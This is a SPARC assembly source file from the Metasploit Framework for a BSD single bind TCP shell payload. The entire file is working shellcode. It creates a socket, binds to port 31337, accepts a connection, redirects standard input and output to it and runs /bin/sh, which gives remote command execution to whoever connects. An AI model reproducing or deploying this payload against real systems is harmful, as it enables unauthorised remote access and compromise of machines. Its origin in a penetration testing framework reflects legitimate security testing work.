##
#
#        Name: single_bind_tcp
#   Platforms: *BSD
#     Authors: vlad902 <vlad902 [at] gmail.com>
#     Version: $Revision$
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Single portbind TCP shell.
#
##

.globl main

main:
  xor	%o3, %o3, %o2
  mov	0x01, %o1
  mov	0x02, %o0
  mov	0x61, %g1
  ta	0x08

  st	%o0, [ %sp - 8 ]

  set	0xff027a68, %l0
  xor	%l1, %l1, %l1
  std	%l0, [ %sp - 16 ]
  sub	%sp, 16, %o1
  mov	0x10, %o2
  mov	0x68, %g1
  ta	0x08

  ld	[ %sp - 8 ], %o0
  mov	0x01, %o1
  mov	0x6a, %g1
  ta	0x08

  ld	[ %sp - 8 ], %o0
  xor	%o1, %o1, %o1
  or	%o1, %o1, %o2
  mov	0x1e, %g1
  ta	0x08

  st	%o0, [ %sp - 8 ]
  xor	%o1, %o1, %o1
  mov	0x5a, %g1 
  ta	0x08

  ld	[ %sp - 8 ], %o0
  mov	1, %o1
  ta	0x08

  ld	[ %sp - 8 ], %o0
  mov	2, %o1
  ta	0x08

  xor	%o3, %o3, %o2
  set	0x2f62696e, %l0
  set	0x2f736800, %l1
  sub	%sp, 0x10, %o0
  sub	%sp, 0x08, %o1
  std	%l0, [ %sp - 16 ]  
  st	%o0, [ %sp - 8 ]
  clr	[ %sp - 4 ]
  mov	0x3b, %g1
  ta	0x08